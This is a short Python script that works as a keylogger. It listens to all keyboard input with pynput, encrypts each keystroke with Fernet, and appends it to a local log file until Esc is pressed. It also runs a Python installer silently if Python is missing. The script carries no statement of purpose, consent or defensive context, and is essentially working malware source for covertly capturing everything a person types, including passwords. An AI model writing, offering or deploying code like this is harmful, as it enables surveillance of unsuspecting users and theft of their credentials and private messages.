import subprocess
import os
from pynput import keyboard
from cryptography.fernet import Fernet

def install_python():
    # Check if Python is installed already
    if not os.path.exists("C:\\Python311\\python.exe"):
        python_installer = "python-3.11.9-amd64.exe"
        # Run Python installer silently
        subprocess.run([python_installer, '/quiet', '/norestart'])

def get_encryption_key():
    try:
        with open('ekey.txt', 'r') as key_file:
            key = key_file.read().strip()
        return key.encode()
    except FileNotFoundError:
        raise ValueError("Encryption key file not found.")
    except Exception as e:
        raise ValueError(f"Error reading encryption key: {str(e)}")

key_count = 0

def keyPressed(key):
    encryption_key = get_encryption_key()
    cipher_suite = Fernet(encryption_key)

    try:
        with open("keyfile.txt", 'ab') as logKey:  # Open in binary mode to write encrypted bytes
            if hasattr(key, 'char') and key.char is not None:
                encrypted_char = cipher_suite.encrypt(key.char.encode())
                logKey.write(encrypted_char)
                logKey.write(b'\n')  # Adding a delimiter for each input
            else:
                if key == keyboard.Key.space:
                    encrypted_space = cipher_suite.encrypt(b' ')
                    logKey.write(encrypted_space)
                    logKey.write(b'\n')  # Adding a delimiter for each input
                else:
                    encrypted_special_key = cipher_suite.encrypt(f'[{key}]'.encode())
                    logKey.write(encrypted_special_key)
                    logKey.write(b'\n')  # Adding a delimiter for each input
    except Exception as e:
        print(f"Error logging key: {str(e)}")  

    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    install_python()

    # Ensure the keyfile.txt is empty at the start
    open("keyfile.txt", 'wb').close()  # Open in binary mode to create an empty file

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()  
    input() 